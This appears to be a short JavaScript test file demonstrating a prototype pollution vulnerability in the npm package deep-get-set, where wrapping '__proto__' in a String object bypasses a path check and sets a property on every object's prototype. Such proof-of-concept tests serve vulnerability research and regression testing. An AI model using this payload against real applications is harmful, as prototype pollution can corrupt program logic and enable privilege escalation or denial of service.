test("prototype pollution in deep-get-set", () => {
  const deep = require("deep-get-set");

  expect({}.polluted).toBe(undefined);

  deep({}, [new String("__proto__"), "polluted"], "yes");
  expect({}.polluted).toBe("yes");
});
